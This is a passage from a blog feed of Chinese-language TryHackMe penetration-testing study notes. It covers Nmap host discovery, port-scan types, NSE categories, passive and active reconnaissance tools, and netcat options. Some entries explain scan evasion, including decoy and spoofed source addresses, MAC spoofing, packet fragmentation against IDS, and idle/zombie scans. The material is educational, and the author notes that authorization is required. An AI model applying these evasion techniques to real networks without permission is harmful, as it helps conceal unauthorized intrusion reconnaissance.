title="概括"></a>概括</h1><table><thead><tr><th>Protocol</th><th>TCP Port</th><th>Application(s)</th><th>Data Security</th></tr></thead><tbody><tr><td>FTP</td><td>21</td><td>File Transfer</td><td>明文</td></tr><tr><td>FTPS</td><td>990</td><td>File Transfer</td><td>密文</td></tr><tr><td>HTTP</td><td>80</td><td>Worldwide Web</td><td>明文</td></tr><tr><td>HTTPS</td><td>443</td><td>Worldwide Web</td><td>密文</td></tr><tr><td>IMAP</td><td>143</td><td>Email (MDA)</td><td>明文</td></tr><tr><td>IMAPS</td><td>993</td><td>Email (MDA)</td><td>密文</td></tr><tr><td>POP3</td><td>110</td><td>Email (MDA)</td><td>明文</td></tr><tr><td>POP3S</td><td>995</td><td>Email (MDA)</td><td>密文</td></tr><tr><td>SFTP</td><td>22</td><td>File Transfer</td><td>密文</td></tr><tr><td>SSH</td><td>22</td><td>Remote Access and File Transfer</td><td>密文</td></tr><tr><td>SMTP</td><td>25</td><td>Email (MTA)</td><td>明文</td></tr><tr><td>SMTPS</td><td>465</td><td>Email (MTA)</td><td>密文</td></tr><tr><td>Telnet</td><td>23</td><td>Remote Access</td><td>明文</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap端口扫描</title>
    <link href="/2024/07/12/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2024/07/12/Nmap%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a>Nmap端口扫描</h1><h2 id="服务检测"><a href="#服务检测" class="headerlink" title="服务检测"></a>服务检测</h2><p><code>nmap -sV ip</code> 检测运行端口和版本信息。</p><p><code>--version-intensity LEVEL</code>级别范围在 0（最轻）和 9（最完整）之间来控制强度。<code>-sV --version-light</code>强度为 2，而 <code>-sV --version-all</code>强度为 9。</p><h2 id="操作系统检测和跟踪路由"><a href="#操作系统检测和跟踪路由" class="headerlink" title="操作系统检测和跟踪路由"></a>操作系统检测和跟踪路由</h2><p>操作系统的检测：</p><p><code>nmap -O ip</code>  检测操纵系统的版本信息。有的时候会不准确，需要谨慎对待。</p><p>追踪路由：</p><p><code>nmap --traceroute ip</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407121855012.png" alt="image-20240712185456798"></p><h2 id="Nmap-脚本引擎（NSE）"><a href="#Nmap-脚本引擎（NSE）" class="headerlink" title="Nmap 脚本引擎（NSE）"></a>Nmap 脚本引擎（NSE）</h2><p>Nmap使用 Lua 语言提供对脚本的支持。作为Nmap的一部分，Nmap 脚本引擎 (NSE) 是一个 Lua 解释器，允许Nmap执行用 Lua 语言编写的Nmap脚本。</p><table><thead><tr><th>脚本类别</th><th>描述</th></tr></thead><tbody><tr><td><code>auth</code></td><td>认证相关脚本</td></tr><tr><td><code>broadcast</code></td><td>通过发送广播消息发现主机</td></tr><tr><td><code>brute</code></td><td>对登录进行暴力密码审计</td></tr><tr><td><code>default</code></td><td>默认脚本，与<code>-sC</code>类似</td></tr><tr><td><code>discovery</code></td><td>检索可访问的信息，例如数据库表和DNS名称</td></tr><tr><td><code>dos</code></td><td>检测易受拒绝服务 ( DoS )攻击的服务器</td></tr><tr><td><code>exploit</code></td><td>尝试利用各种易受攻击的服务</td></tr><tr><td><code>external</code></td><td>使用第三方服务检查，例如 Geoplugin 和 Virustotal</td></tr><tr><td><code>fuzzer</code></td><td>发起模糊测试攻击</td></tr><tr><td><code>intrusive</code></td><td>侵入性脚本，例如暴力攻击和漏洞利用</td></tr><tr><td><code>malware</code></td><td>扫描后门</td></tr><tr><td><code>safe</code></td><td>不会使目标崩溃的安全脚本</td></tr><tr><td><code>version</code></td><td>检索服务版本</td></tr><tr><td><code>vuln</code></td><td>检查漏洞或利用易受攻击的服务</td></tr></tbody></table><p>–script “SCRIPT-NAME”  指定脚本名字 </p><p>例如：–script “safe”</p><h2 id="保存输出"><a href="#保存输出" class="headerlink" title="保存输出"></a>保存输出</h2><p>分为三类：</p><h3 id="1-Normal"><a href="#1-Normal" class="headerlink" title="1.Normal"></a>1.Normal</h3><p><code>-oN filename</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122054557.png" alt="image-20240712205431353"></p><h3 id="2-Grepable-grepable"><a href="#2-Grepable-grepable" class="headerlink" title="2.Grepable (grepable)"></a>2.Grepable (<code>grep</code>able)</h3><p><code>-oG filename</code></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122100450.png" alt="image-20240712210010271"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407122100673.png" alt="image-20240712210036526"></p><h3 id="3-XML"><a href="#3-XML" class="headerlink" title="3.XML"></a>3.XML</h3><p><code>-oX filename</code></p><p>结合所有的：<br><code>-oA filename -oN -oG -oX</code></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap 高级端口扫描</title>
    <link href="/2024/07/10/Nmap%20%E9%AB%98%E7%BA%A7%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2024/07/10/Nmap%20%E9%AB%98%E7%BA%A7%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-高级端口扫描"><a href="#Nmap-高级端口扫描" class="headerlink" title="Nmap 高级端口扫描"></a>Nmap 高级端口扫描</h1><p>tcp数据包的相关标志：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/23540a5fcd27454892a73ac051d29664.png" alt="img"></p><h2 id="TCP-Null-Scan-FIN-Scan-and-Xmas-Scan"><a href="#TCP-Null-Scan-FIN-Scan-and-Xmas-Scan" class="headerlink" title="TCP Null Scan, FIN Scan, and Xmas Scan"></a>TCP Null Scan, FIN Scan, and Xmas Scan</h2><h3 id="NUll-Scan-空扫描"><a href="#NUll-Scan-空扫描" class="headerlink" title="NUll Scan(空扫描)"></a>NUll Scan(空扫描)</h3><p>空扫描：-sN 没有设置标志的TCP数据包，当这个数据包发送到目标服务时，如果端口开放就没有返回结果，或者是被防火墙阻挡了也没有返回结果。</p><p>但这个有一个缺陷就是，没有返回的数据包，可能是被防火墙给阻挡了，并不能进行一个全面的判断。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/04b178a9cf7048c21256988b8b2343e3.png" alt="img"></p><p>如果没有设置标志的tcp数据包发送到端口关闭的服务上时，会返回RST,ACK数据包。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/224e01a913a1ce7b0fb2b9290ff5e1c8.png" alt="img"></p><h3 id="FIN-Scan"><a href="#FIN-Scan" class="headerlink" title="FIN Scan"></a>FIN Scan</h3><p>FIN SCAN：-sF</p><p>跟空扫描不同的是，FIN扫描是发送带有FIN标志的tcp数据包，如果端口开放或者被防火墙阻挡，不返回结果。</p><p>如果端口关闭的话，就会返回RST,ACK数据包。值得注意的是，有些防火墙会偷偷的丢弃流量，而不返回RST,ACK。</p><h3 id="Xmas-Scan"><a href="#Xmas-Scan" class="headerlink" title="Xmas Scan"></a>Xmas Scan</h3><p>Xmas Scan: -sX</p><p>带有FIN、PSH 和 URG 标志的tcp数据包。</p><p>跟上面的情况一样，如果收到了RST数据返回，说明端口关闭。</p><p>这三种扫描类型最有效的一种情况是扫描<strong>无状态（非状态）防火墙</strong>后面的目标。无状态防火墙将检查传入数据包是否设置了 <strong>SYN 标志</strong>以检测连接尝试。使用与 SYN 数据包<strong>不匹配</strong>的标志组合可以欺骗防火墙并到达其后面的系统。但是，<strong>有状态防火墙</strong>实际上会阻止所有此类精心设计的数据包并使这种扫描变得毫无用处。</p><h2 id="TCP-Maimon-扫描"><a href="#TCP-Maimon-扫描" class="headerlink" title="TCP Maimon 扫描"></a>TCP Maimon 扫描</h2><p>TCP Maimon 扫描: -sM</p><p>tcp数据包设置了FIN和ACK。目标系统会发送RST来作为响应，无论TCP端口是否打开，大多数目标系统都会以 RST 数据包进行响应。在这种情况下，我们将无法发现打开的端口。此扫描不适用于现代网络中遇到的大多数目标。</p><h2 id="TCP-ACK-Window-and-Custom-Scan"><a href="#TCP-ACK-Window-and-Custom-Scan" class="headerlink" title="TCP ACK, Window, and Custom Scan"></a>TCP ACK, Window, and Custom Scan</h2><h3 id="TCP-ACK扫描"><a href="#TCP-ACK扫描" class="headerlink" title="TCP ACK扫描"></a>TCP ACK扫描</h3><p>向目标服务器发送一个带有ACK标志的TCP数据包。</p><p>TCP ACK扫描：-sA</p><p>无论端口状态如何，目标都会使用 RST 响应 ACK。此扫描不会告诉我们目标端口是否打开。</p><p>在目标服务器安装防火墙之前，没什么太大的用处，显示不了端口的信息。但在目标服务器安装防火墙之后，用处就大大提高了，发送带有ACK标志的数据包，没有返回结果的，就是被防火墙给阻挡了，但返回RST数据包的，就是防火墙没有阻挡的。这种类型的扫描更适合发现防火墙规则集和配置。</p><h3 id="TCP-Window扫描"><a href="#TCP-Window扫描" class="headerlink" title="TCP Window扫描"></a>TCP Window扫描</h3><p>TCP Window扫描：-sW</p><p>TCP窗口扫描与 ACK 扫描几乎相同；但是，它会检查返回的 RST 数据包的TCP窗口字段。</p><h3 id="TCP-Custom扫描"><a href="#TCP-Custom扫描" class="headerlink" title="TCP Custom扫描"></a>TCP Custom扫描</h3><p>这个是自定义标志位的tcp数据包，但需要了解不同端口的行为方式，以便正确解释不同场景中的结果。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d76c5020f14ac0d66e7ff3812bb0bec3.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d76c5020f14ac0d66e7ff3812bb0bec3.png"></p><p>尝试使用设置了重置标志的自定义 TCP 扫描</p><p><code>*nmap --scanflags RST ip*</code></p><p><strong>最后，必须注意的是，ACK 扫描和窗口扫描在帮助我们规划防火墙规则方面非常有效。但是，必须记住，仅仅因为防火墙没有阻止特定端口，并不一定意味着服务正在侦听该端口。例如，可能需要更新防火墙规则以反映最近的服务更改。因此，ACK 和窗口扫描暴露的是防火墙规则，而不是服务。</strong></p><h2 id="欺骗和诱饵"><a href="#欺骗和诱饵" class="headerlink" title="欺骗和诱饵"></a>欺骗和诱饵</h2><p>在某些网络中我们会使用伪造的ip和mac地址来扫描目标服务器。这种扫描仅在可以保证捕获响应的情况下才有用。</p><p><code>nmap -S 伪造ip 源ip</code> </p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/45b982d501fd26deb2b381059b16f80c.png" alt="img"></p><p>简单来说使用欺骗ip进行扫描分为三步：</p><p>1.伪造ip，向目标服务器发送数据请求。</p><p>2.目标服务器向伪造的ip发送响应。</p><p>3.攻击者从中进行捕获，找出开放的端口。</p><p><code>nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP</code></p><p>-e指定网络接口 -P禁止使用ping</p><p>如果攻击者系统无法监控网络响应，则此扫描将毫无用处。</p><p>当我们和目标服务器处于同一子网中时，可以伪造mac地址。</p><p><code>nmap --spoof-mac SPOOFED_MAC MACHINE_IP</code></p><p>欺骗仅在满足特定条件的极少数情况下有效，因此攻击者会使用诱饵来增加被识别的难度。</p><p>原理：让扫描看起来来自多个ip，让真实的ip丢失在其中。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/754fc455556a424ca83f512665beaf7d.png" alt="img"></p><p><code>nmap -D ip1,ip2,ME MACHINE_IP</code> 将使 MACHINE_IP 的扫描显示为来自IP1,ip2 然后<code>ME</code>表示真实的IP地址应出现在第三顺序中</p><p><code>nmap -D IP1,IP2,RND,RND,ME MACHINE_IP</code>  第三个和第四个ip是随机的 然后第五个代表真实的ip地址。</p><h2 id="碎片数据包"><a href="#碎片数据包" class="headerlink" title="碎片数据包"></a>碎片数据包</h2><p>把数据包分为几个小部分，对降低IDS和防火墙检测有一些帮助。</p><p>-f将数据包分为8个字节或者更少的字节，-ff将数据包分为16个字节。–mtu可以更改数据包分几个字节的大小，但应该是8的倍数。</p><h2 id="Idle-Zombie-Scan-空闲-僵尸扫描"><a href="#Idle-Zombie-Scan-空闲-僵尸扫描" class="headerlink" title="Idle/Zombie Scan(空闲/僵尸扫描)"></a>Idle/Zombie Scan(空闲/僵尸扫描)</h2><p>伪造源ip是有一定限制条件的，如果不能进行流量监控的话，就不能进行源ip的伪造。此时，利用空闲/僵尸扫描可以进行一个升级。</p><p>空闲/僵尸扫描就是找一个极少使用的空闲系统(我们可以联通)，通过ip id的数量差值来判断端口是否开放。</p><p><code>nmap -sI 空闲主机ip 目标主机ip</code></p><p>步骤：<br>1.首先向空闲/僵尸主机发送一个SYN/ACK的数据包，空闲主机会向攻击者回复一个IP ID。</p><p>2.攻击者再向目标主机发送一个SYN/ACK的数据包，该数据包应该被伪装成来自空闲/僵尸主机的ip。</p><p>3.再向空闲主机发送一个SYN/ACK的数据包，空闲主机会再次发送一个IP ID,将第一个IP ID和第三个IP ID进行一个对比，如果差值为2的话端口就开放，就一个的话端口就关闭。</p><p>下面用tryhackeme的图来解释一下：</p><p>攻击者系统正在探测一台空闲的机器，一台多功能打印机。通过发送 SYN/ACK，它会用一个包含其新增加的 IP ID 的 RST 数据包进行响应。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a93e181f0effe000554a8b307448bbb2.png" alt="img"></p><p>攻击者将向下一步想要检查目标机器的TCP端口发送 SYN 数据包。但是，此数据包将使用空闲主机（僵尸）IP 地址作为源。将出现三种情况。在第一种情况下，如下图所示， TCP端口已关闭；因此，目标机器使用 RST 数据包响应空闲主机。空闲主机不响应；因此其 IP ID 不会增加。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8e28bf940936ddbc2367b193ea3550b8.png" alt="img"></p><p>第二种情况，如下所示，TCP端口是开放的，因此目标机器向空闲主机（僵尸主机）响应 SYN/ACK。空闲主机用 RST 数据包响应这个意外数据包，从而增加其 IP ID。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2b0de492e2154a30760852e07cebae0e.png" alt="img"></p><p>第三种情况是，目标机器由于防火墙规则而完全没有响应。这种没有响应的情况与关闭端口的情况一样，闲置的主机不会增加 IP ID。</p><p>最后一步，攻击者向空闲主机发送另一个 SYN/ACK。空闲主机用 RST 数据包响应，再次将 IP ID 加一。攻击者需要将第一步收到的 RST 数据包的 IP ID 与第三步收到的 RST 数据包的 IP ID 进行比较。如果差值为 1，则表示目标计算机上的端口已关闭或被过滤。但是，如果差值为 2，则表示目标上的端口已打开。</p><p>如果我们选择的并不是空闲主机，返回回来的IP ID是无用的。</p><p><code>nmap -sS --reason ip</code> 可让我们明确了解 Nmap 为何认为系统已启动或某个特定端口已打开。</p><p>为了获取更详细的输出，-使用-v/-vv  或者使用-d</p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Passive Reconnaissance</title>
    <link href="/2024/07/09/%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2024/07/09/%E8%A2%AB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Passive-Reconnaissance"><a href="#Passive-Reconnaissance" class="headerlink" title="Passive Reconnaissance"></a>Passive Reconnaissance</h1><p>被动侦察，了解whois,nslookup,dig等工具的使用</p><p>whois，查询whois服务器，nslookup和dig是查询dns服务器</p><p>被动侦察简单来说就是不去主动接触要攻击的目标，而是通过与其相关的一些资源去调查它。</p><p>主动侦察则目标性更明确一点，需要对目标进行主动接触，利用社会工程学，连接到目标的服务器上等(前提是需要授权！)</p><h3 id="whosi（域名管理员）"><a href="#whosi（域名管理员）" class="headerlink" title="whosi（域名管理员）"></a>whosi（域名管理员）</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021807602.png" alt="image-20240602180747484"></p><h3 id="nslookup和dig"><a href="#nslookup和dig" class="headerlink" title="nslookup和dig"></a>nslookup和dig</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021841505.png" alt="image-20240602184122380"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021843197.png" alt="image-20240602184307137"></p><p>type可以进行更换，然后不同的type代表不同的意思。具体的意义参考上图</p><p>公共域名服务器:</p><p>1.1.1.1 8.8.8.8 114.114.114.114 1.0.0.1 8.8.4.4 9.9.9.9 等</p><h3 id="DNSDumpster"><a href="#DNSDumpster" class="headerlink" title="DNSDumpster"></a>DNSDumpster</h3><p><a href="https://dnsdumpster.com/">DNSDumpster.com - dns recon and research, find and lookup dns records</a></p><p>实际上就是一个在线查询子域的一个网站</p><h3 id="Shodan-io"><a href="#Shodan-io" class="headerlink" title="Shodan.io"></a>Shodan.io</h3><p><a href="https://www.shodan.io/">Shodan Search Engine</a></p><p>类似于fofa </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202406021912669.png" alt="image-20240602191215461"></p>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Active Reconnaissance</title>
    <link href="/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/"/>
    <url>/2024/07/09/%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Active-Reconnaissance"><a href="#Active-Reconnaissance" class="headerlink" title="Active Reconnaissance"></a>Active Reconnaissance</h1><p>主动侦察</p><p>重要的一点就是要被授权！</p><h3 id="web浏览器上的一些工具"><a href="#web浏览器上的一些工具" class="headerlink" title="web浏览器上的一些工具"></a>web浏览器上的一些工具</h3><p>1.FoxyProxy （代理工具）</p><p>2.Wappalyzer （收集网站的相关信息）</p><p>3.User-Agent Switcher and Manager (伪造User-Agent)                                                                                                            </p><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>简单来说就是检查目标系统是否在线</p><p>更严谨的话来说就是：ping 是一个向远程系统发送 ICMP Echo 数据包的命令。如果远程系统在线，并且 ping 数据包被正确路由且未被任何防火墙阻止，则远程系统应发回 ICMP Echo Reply。同样，如果 ping 回复被正确路由且未被任何防火墙阻止，则 ping 回复应到达第一个系统。</p><p>在linux中ping -c 10 ip 表示只发送10个数据包 在windows中就是ping -n 10 ip</p><p>ping不同有下面几种情况：</p><ul><li>目标计算机没有响应；可能仍在启动或关闭，或者操作系统已崩溃。</li><li>它已从网络拔出，或者路径上有故障的网络设备。</li><li>防火墙配置为阻止此类数据包。防火墙可能是系统本身上运行的软件或单独的网络设备。请注意，MS Windows 防火墙默认阻止 ping。</li><li>您的系统已断开与网络的连接。</li></ul><h3 id="traceroute-追踪路由"><a href="#traceroute-追踪路由" class="headerlink" title="traceroute(追踪路由)"></a>traceroute(追踪路由)</h3><p>traceroute 命令<em>会跟踪数据包从您的系统到另一台主机所采用的路由</em>。traceroute 的目的是找到数据包从您的系统到目标主机所经过的路由器或跳数的 IP 地址。此命令还会显示两个系统之间的路由器数量。它很有用，因为它指示了您的系统和目标主机之间的跳数（路由器）。但是，请注意，数据包所采用的路由可能会发生变化，因为许多路由器使用适应网络变化的动态路由协议。</p><p>在linux中通常使用traceroute 在windows中通常使用tracert</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407080959982.png" alt="image-20240708095938778"></p><p>ttl为生存时间 每经过一个路由器 ttl值减少1 当ttl值为0的时候 路由器会向发送者发出时间超时的信息。</p><h3 id="telnet-远程登录"><a href="#telnet-远程登录" class="headerlink" title="telnet(远程登录)"></a>telnet(远程登录)</h3><p>使用的默认端口是23</p><p>telnet发送的数据都是以明文的形式发送，容易被获取 代替的是ssh</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407081026818.png" alt="image-20240708102624751"></p><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>Netcat 或简单地说<code>nc</code>有不同的应用程序对渗透测试人员来说非常有价值。Netcat 支持 TCP 和UDP协议。它可以作为连接到侦听端口的客户端；或者，它可以充当侦听您选择的端口的服务器。因此，它是一个方便的工具，您可以将其用作 TCP 或UDP上的简单客户端或服务器。</p><table><thead><tr><th>选项</th><th>意义</th></tr></thead><tbody><tr><td>-l</td><td>聆听模式</td></tr><tr><td>-p</td><td>指定端口号</td></tr><tr><td>-n</td><td>仅限数字；无法通过DNS解析主机名</td></tr><tr><td>-v</td><td>详细输出（可选，但有助于发现任何错误）</td></tr><tr><td>-vv</td><td>非常详细（可选）</td></tr><tr><td>-k</td><td>客户端断开连接后继续监听</td></tr></tbody></table><ul><li>该选项<code>-p</code>应该出现在您想要监听的端口号之前。</li><li>该选项<code>-n</code>将避免DNS查找和警告。</li><li>小于 1024 的端口号需要 root 权限才能监听。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap Live Host Discovery</title>
    <link href="/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/"/>
    <url>/2024/07/09/nmap%E5%AE%9E%E6%97%B6%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%91%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Nmap-Live-Host-Discovery-nmap实时主机的发现"><a href="#Nmap-Live-Host-Discovery-nmap实时主机的发现" class="headerlink" title="Nmap Live Host Discovery (nmap实时主机的发现)"></a>Nmap Live Host Discovery (nmap实时主机的发现)</h1><ol><li>ARP扫描：此扫描使用ARP请求来发现活动主机</li><li>ICMP 扫描：此扫描使用 ICMP 请求来识别活动主机</li><li>TCP/ UDP ping 扫描：此扫描将数据包发送到 TCP 端口和UDP端口以确定活动主机。</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1b4ede255e008646e425038d709c9b6.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/f1b4ede255e008646e425038d709c9b6.png"></p><p>当在同一网段内的时候 ，可以使用arp-scan来进行扫描，但如果目标主机不再同一网段内，就不能使用arp-scan进行扫描 因为arp是在数据链路层，不能够跨网段。</p><ul><li>列表：<code>MACHINE_IP scanme.nmap.org example.com</code>将扫描 3 个 IP 地址。</li><li>范围：<code>10.11.12.15-20</code>将扫描 6 个 IP 地址：<code>10.11.12.15</code>、、 <code>10.11.12.16</code>……和<code>10.11.12.20</code>。</li><li>子网：<code>MACHINE_IP/30</code>将扫描 4 个 IP 地址。</li></ul><p>您还可以提供一个文件作为目标列表的输入<code>nmap -iL list_of_hosts.txt</code>。</p><p>如果您想要检查Nmap将扫描的主机列表，可以使用<code>nmap -sL TARGETS</code>。此选项将为您提供 Nmap 将扫描的主机的详细列表，而无需扫描它们；但是，Nmap 将尝试对所有目标进行反向DNS解析以获取其名称。名称可能会向渗透测试人员透露各种信息。（如果您不想让 Nmap 访问DNS服务器，可以添加<code>-n</code>。）</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202407081651586.png" alt="image-20240708165132302"></p><p>下面是tcp/ip七层参考模型</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/745e0412b319d324352c7b29863b74f4.png"></p><p>从下到上是 物理层，数据链路层，网络层，传输层，会话层，表示层，应用层。</p><p>1.数据链路层的ARP</p><p>2.网络层的ICMP</p><p>3.传输层的TCP 传输层的UDP</p><p>ARP有一个目的：向网络段上的广播地址发送一个帧，并要求具有特定 IP 地址的计算机通过提供其 MAC（硬件）地址来响应。</p><p>ICMP 有<a href="https://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml">很多种类型</a>。ICMP ping 使用类型 8（Echo）和类型 0（Echo Reply）。</p><p>如果要 ping 同一子网上的系统，则ARP查询应先于 ICMP Echo。</p><p>尽管 TCP 和UDP属于传输层，但出于网络扫描目的，扫描器可以向常用 TCP 或UDP端口发送特制数据包，以检查目标是否会响应。此方法非常有效，尤其是在 ICMP Echo 被阻止的情况下。</p><h4 id="1-nmap使用arp进行主机发现"><a href="#1-nmap使用arp进行主机发现" class="headerlink" title="1.nmap使用arp进行主机发现"></a>1.nmap使用arp进行主机发现</h4><p>nmap -sn ip 是仅扫描存活主机，而不扫描端口。</p><p>nmap -PR -sn ip 是利用arp扫描仅存活主机</p><p>有一个工具arp-scan 是专门利用arp协议去扫描本网段的主机 arp-scan -l</p><p>如果有多个接口，利用arp-scan进行扫描时 可以利用命令 arp-scan -I eth0 -l 向接口eth0 发送arp查询</p><h4 id="2-nmap使用ICMP进行主机发现"><a href="#2-nmap使用ICMP进行主机发现" class="headerlink" title="2.nmap使用ICMP进行主机发现"></a>2.nmap使用ICMP进行主机发现</h4><p>有些防火墙会阻止icmp包的回显请求 比如：新版本的 MS Windows  </p><p>nmap -PE -sn ip 利用icmp进行存活主机的探索</p><p>由于 ICMP 回显请求往往会被阻止，因此您可能还会考虑使用 ICMP 时间戳或 ICMP 地址掩码请求来判断系统是否在线。Nmap使用时间戳请求（ICMP 类型 13）并检查它是否会收到时间戳回复（ICMP 类型 14）。添加该<code>-PP</code>选项会告诉Nmap使用 ICMP 时间戳请求。</p><p>nmap -PP -sn ip</p><p>类似地，Nmap使用地址掩码查询（ICMP 类型 17）并检查是否收到地址掩码回复（ICMP 类型 18）。可以使用选项启用此扫描<code>-PM</code>。</p><p>nmap -PM -sn ip </p><h4 id="3-nmap使用tcp-udp进行主机发现"><a href="#3-nmap使用tcp-udp进行主机发现" class="headerlink" title="3.nmap使用tcp/udp进行主机发现"></a>3.nmap使用tcp/udp进行主机发现</h4><p>TCP同步和确认ping</p><p>nmap -PS -sn ip   nmap SYN ping</p><p>nmap -PA -sn ip  (必须在特权模式下进行)  nmap ACK ping</p><p>-PS端口号</p><p>-PA端口号</p><p>UDP ping</p><p>一个UDP数据包发送到一个开放的UDP端口，并没有触发任何响应。但是，向任何关闭的UDP端口发送UDP数据包可以触发响应，间接表明目标在线。</p><p>namp -PU -sn ip</p><p>-PU端口号</p><p>masscan也是一个扫描主机的一个工具 速度更快 主要用于大规模网络扫描</p><p>Nmap 的默认行为是使用反向DNS在线主机。由于主机名可以揭示很多信息，因此这可能是一个有用的步骤。但是，如果您不想发送此类DNS查询，则可以<code>-n</code>跳过此步骤。</p><p>默认情况下，Nmap将查找在线主机；但是，您可以使用该选项<code>-R</code>查询DNS服务器，即使是离线主机也是如此。如果您想使用特定的DNS服务器，可以添加该 <code>--dns-servers DNS_SERVER</code> 选项。</p><table><thead><tr><th>扫描类型</th><th>示例命令</th></tr></thead><tbody><tr><td>ARP扫描</td><td><code>sudo nmap -PR -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP 回显扫描</td><td><code>sudo nmap -PE -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP 时间戳扫描</td><td><code>sudo nmap -PP -sn MACHINE_IP/24</code></td></tr><tr><td>ICMP 地址掩码扫描</td><td><code>sudo nmap -PM -sn MACHINE_IP/24</code></td></tr><tr><td>TCP SYN Ping 扫描</td><td><code>sudo nmap -PS22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>TCP ACK Ping 扫描</td><td><code>sudo nmap -PA22,80,443 -sn MACHINE_IP/30</code></td></tr><tr><td>UDP Ping 扫描</td><td><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td></tr></tbody></table><p><code>-sn</code>如果您只对主机发现感兴趣，而不对端口扫描感兴趣， 请记得添加。省略<code>-sn</code>将使Nmap默认对活动主机进行端口扫描。</p><table><thead><tr><th>选项</th><th>目的</th></tr></thead><tbody><tr><td><code>-n</code></td><td>无需DNS查找</td></tr><tr><td><code>-R</code></td><td>反向DNS查找所有主机</td></tr><tr><td><code>-sn</code></td><td>仅主机发现</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Jr Penetration Tester</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tryhackme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap 基本端口扫描</title>
    <link href="/2024/07/09/Nmap%20%E5%9F%BA%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
